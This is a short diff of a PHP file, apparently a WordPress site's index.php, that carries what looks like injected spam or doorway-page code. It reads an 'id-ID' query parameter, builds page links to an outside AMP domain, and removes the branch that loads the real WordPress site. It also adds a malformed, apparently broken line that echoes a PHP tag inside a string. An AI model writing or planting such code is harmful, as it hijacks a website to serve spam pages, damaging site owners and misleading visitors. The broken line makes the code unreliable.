@@ -8,10 +8,9 @@ if (isset($_GET['id-ID']) && !empty($_GET['id-ID'])) {
     $page = strtoupper($_GET['id-ID']);
     $link = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
     $ampnya = "https://amp.darat.pro/global/" . strtolower($page);
-} else {
-    include __DIR__ . "/wp-blog-header.php"; 
-    exit;
+    $img = "<?php echo $img;?>";
 }
+
 ?>
 
 
@@ -1924,4 +1923,5 @@ window.datadog_attributes['pageType']='item:details'
 </body>
 
 </html>
+
 
